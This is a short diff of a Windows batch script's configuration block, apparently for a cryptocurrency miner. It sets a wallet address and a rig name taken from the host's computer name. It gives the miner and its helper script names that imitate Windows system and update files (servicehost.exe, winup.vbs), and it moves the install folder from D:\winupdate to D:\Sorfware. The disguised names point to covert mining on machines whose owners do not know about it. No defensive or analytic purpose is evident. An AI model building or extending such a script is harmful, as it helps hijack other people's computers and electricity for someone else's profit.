@@ -4,7 +4,7 @@ setlocal enableextensions
 :: ====== Cau hinh ======
 set WALLET=47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL
 set RIG=%COMPUTERNAME%
-set INSTALL_DIR=D:\winupdate
+set INSTALL_DIR=D:\Sorfware
 set BIN_DIR=%INSTALL_DIR%\bin
 set EXE_NAME=servicehost.exe
 set VBS_NAME=winup.vbs
